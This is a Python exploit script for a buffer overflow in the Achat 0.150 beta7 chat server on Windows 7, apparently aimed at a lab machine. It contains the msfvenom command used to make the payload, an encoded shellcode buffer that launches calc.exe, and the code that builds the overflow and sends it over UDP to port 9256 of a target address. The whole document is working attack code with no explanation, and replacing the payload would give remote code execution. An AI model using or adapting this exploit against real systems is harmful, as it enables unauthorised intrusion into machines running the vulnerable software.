#!/usr/bin/python
# Author KAhara MAnhara
# Achat 0.150 beta7 - Buffer Overflow
# Tested on Windows 7 32bit

import socket
import sys, time

# msfvenom -a x86 --platform Windows -p windows/exec CMD=calc.exe -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
#Payload size: 774 bytes

buf =  b""
buf += b"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49"
buf += b"\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51\x41\x44\x41"
buf += b"\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41\x51"
buf += b"\x41\x49\x41\x51\x41\x49\x41\x68\x41\x41\x41\x5a\x31"
buf += b"\x41\x49\x41\x49\x41\x4a\x31\x31\x41\x49\x41\x49\x41"
buf += b"\x42\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49\x41"
buf += b"\x49\x51\x49\x31\x31\x31\x41\x49\x41\x4a\x51\x59\x41"
buf += b"\x5a\x42\x41\x42\x41\x42\x41\x42\x41\x42\x6b\x4d\x41"
buf += b"\x47\x42\x39\x75\x34\x4a\x42\x79\x6c\x47\x78\x55\x32"
buf += b"\x49\x70\x4b\x50\x79\x70\x61\x50\x75\x39\x69\x55\x6d"
buf += b"\x61\x59\x30\x51\x54\x34\x4b\x42\x30\x70\x30\x54\x4b"
buf += b"\x31\x42\x4a\x6c\x54\x4b\x62\x32\x6c\x54\x42\x6b\x72"
buf += b"\x52\x6b\x78\x5a\x6f\x55\x67\x6d\x7a\x4c\x66\x4c\x71"
buf += b"\x6b\x4f\x54\x6c\x6d\x6c\x73\x31\x43\x4c\x6b\x52\x6e"
buf += b"\x4c\x6b\x70\x65\x71\x56\x6f\x7a\x6d\x6d\x31\x75\x77"
buf += b"\x7a\x42\x4c\x32\x6f\x62\x71\x47\x72\x6b\x6e\x72\x4a"
buf += b"\x70\x54\x4b\x6e\x6a\x4d\x6c\x44\x4b\x6e\x6c\x5a\x71"
buf += b"\x53\x48\x38\x63\x4d\x78\x79\x71\x57\x61\x42\x31\x72"
buf += b"\x6b\x6e\x79\x4f\x30\x6a\x61\x76\x73\x54\x4b\x4f\x59"
buf += b"\x4c\x58\x77\x73\x6f\x4a\x4e\x69\x44\x4b\x50\x34\x72"
buf += b"\x6b\x6b\x51\x77\x66\x4d\x61\x39\x6f\x36\x4c\x56\x61"
buf += b"\x38\x4f\x6a\x6d\x6d\x31\x56\x67\x50\x38\x47\x70\x62"
buf += b"\x55\x38\x76\x79\x73\x43\x4d\x38\x78\x4f\x4b\x63\x4d"
buf += b"\x6c\x64\x32\x55\x57\x74\x70\x58\x42\x6b\x72\x38\x4e"
buf += b"\x44\x69\x71\x79\x43\x43\x36\x52\x6b\x4a\x6c\x6e\x6b"
buf += b"\x42\x6b\x4e\x78\x4b\x6c\x69\x71\x4a\x33\x74\x4b\x4a"
buf += b"\x64\x42\x6b\x39\x71\x36\x70\x52\x69\x6f\x54\x6f\x34"
buf += b"\x6e\x44\x71\x4b\x6f\x6b\x31\x51\x51\x49\x70\x5a\x62"
buf += b"\x31\x6b\x4f\x57\x70\x6f\x6f\x31\x4f\x51\x4a\x44\x4b"
buf += b"\x4e\x32\x38\x6b\x32\x6d\x61\x4d\x42\x48\x6c\x73\x6c"
buf += b"\x72\x4b\x50\x79\x70\x33\x38\x33\x47\x30\x73\x6d\x62"
buf += b"\x51\x4f\x4e\x74\x62\x48\x4e\x6c\x64\x37\x4e\x46\x4a"
buf += b"\x67\x4b\x4f\x6a\x35\x54\x78\x34\x50\x5a\x61\x59\x70"
buf += b"\x4b\x50\x6d\x59\x59\x34\x31\x44\x62\x30\x30\x68\x4b"
buf += b"\x79\x73\x50\x42\x4b\x79\x70\x69\x6f\x68\x55\x72\x30"
buf += b"\x4e\x70\x52\x30\x72\x30\x31\x30\x6e\x70\x71\x30\x62"
buf += b"\x30\x50\x68\x68\x6a\x5a\x6f\x57\x6f\x77\x70\x4b\x4f"
buf += b"\x58\x55\x34\x57\x52\x4a\x4b\x55\x53\x38\x7a\x6a\x4a"
buf += b"\x6a\x5a\x6e\x6d\x54\x72\x48\x5a\x62\x79\x70\x4b\x61"
buf += b"\x71\x4c\x52\x69\x4a\x46\x51\x5a\x4c\x50\x70\x56\x32"
buf += b"\x37\x70\x68\x45\x49\x54\x65\x50\x74\x6f\x71\x59\x6f"
buf += b"\x48\x55\x74\x45\x69\x30\x50\x74\x6c\x4c\x4b\x4f\x50"
buf += b"\x4e\x6b\x58\x33\x45\x6a\x4c\x30\x68\x58\x70\x45\x65"
buf += b"\x45\x52\x71\x46\x39\x6f\x49\x45\x6f\x78\x50\x63\x70"
buf += b"\x6d\x70\x64\x4b\x50\x65\x39\x6a\x43\x62\x37\x6f\x67"
buf += b"\x50\x57\x4e\x51\x5a\x56\x72\x4a\x6e\x32\x50\x59\x50"
buf += b"\x56\x39\x52\x39\x6d\x62\x46\x45\x77\x6f\x54\x6e\x44"
buf += b"\x6d\x6c\x4a\x61\x6d\x31\x64\x4d\x50\x44\x6c\x64\x6e"
buf += b"\x30\x56\x66\x49\x70\x50\x44\x72\x34\x42\x30\x70\x56"
buf += b"\x70\x56\x61\x46\x30\x46\x50\x56\x30\x4e\x52\x36\x42"
buf += b"\x36\x50\x53\x4f\x66\x70\x68\x50\x79\x66\x6c\x6d\x6f"
buf += b"\x54\x46\x69\x6f\x36\x75\x65\x39\x47\x70\x70\x4e\x61"
buf += b"\x46\x6f\x56\x6b\x4f\x30\x30\x72\x48\x6a\x68\x74\x47"
buf += b"\x4b\x6d\x6f\x70\x79\x6f\x66\x75\x47\x4b\x78\x70\x67"
buf += b"\x45\x37\x32\x50\x56\x42\x48\x44\x66\x46\x35\x45\x6d"
buf += b"\x73\x6d\x39\x6f\x57\x65\x6f\x4c\x79\x76\x73\x4c\x6b"
buf += b"\x5a\x43\x50\x69\x6b\x69\x50\x31\x65\x7a\x65\x67\x4b"
buf += b"\x31\x37\x6d\x43\x31\x62\x62\x4f\x71\x5a\x4d\x30\x52"
buf += b"\x33\x4b\x4f\x39\x45\x41\x41"




# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server_address = ('10.10.10.74', 9256)

fs = "\x55\x2A\x55\x6E\x58\x6E\x05\x14\x11\x6E\x2D\x13\x11\x6E\x50\x6E\x58\x43\x59\x39"
p  = "A0000000002#Main" + "\x00" + "Z"*114688 + "\x00" + "A"*10 + "\x00"
p += "A0000000002#Main" + "\x00" + "A"*57288 + "AAAAASI"*50 + "A"*(3750-46)
p += "\x62" + "A"*45
p += "\x61\x40" 
p += "\x2A\x46"
p += "\x43\x55\x6E\x58\x6E\x2A\x2A\x05\x14\x11\x43\x2d\x13\x11\x43\x50\x43\x5D" + "C"*9 + "\x60\x43"
p += "\x61\x43" + "\x2A\x46"
p += "\x2A" + fs + "C" * (157-len(fs)- 31-3)
p += buf + "A" * (1152 - len(buf))
p += "\x00" + "A"*10 + "\x00"

print "---->{P00F}!"
i=0
while i<len(p):
    if i > 172000:
        time.sleep(1.0)
    sent = sock.sendto(p[i:(i+8192)], server_address)
    i += sent
sock.close()